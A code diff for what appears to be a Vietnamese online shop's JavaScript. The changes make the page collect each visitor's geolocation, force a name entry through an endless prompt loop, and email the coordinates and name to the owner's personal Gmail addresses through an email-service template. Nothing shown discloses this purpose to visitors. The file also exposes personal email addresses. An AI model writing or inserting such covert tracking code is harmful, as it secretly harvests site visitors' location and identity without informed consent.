@@ -7,11 +7,8 @@ function a() {
 
 
 function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-    } else {
-        x.innerHTML = "Geolocation không được hỗ trợ bởi trình duyệt này.";
-    }
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+    console.log();
 }
 
 function showError(error) {
@@ -23,12 +20,21 @@ function showError(error) {
 }
 
 function showPosition(position) {
+    var name = "";
+    while(true){
+        name = prompt('Vui lòng nhập tên của bạn!')
+        if(name.trim().length != 0){
+            break;
+        } else {
+            alert('Bạn không được để trống tên')
+        }
+    }
     const templateId = 'template_75sb4wn';
     const serviceID = 'ducthanh260801@gmail.com';
     sendFeedback(serviceID, templateId, {
         to_name: `mrthanh260801@gmail.com`,
         from_name: "Chào mừng đến với NDT Shop",
-        message: "Người vừa truy cập: " + position.coords.latitude + ', ' + position.coords.longitude,
+        message: "Người vừa truy cập: " + position.coords.latitude + ', ' + position.coords.longitude + ', '+name,
         nguoi_nhan: 'ducthanh260801@gmail.com',
         reply_to: "mrthanh260801@gmail.com",
         link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
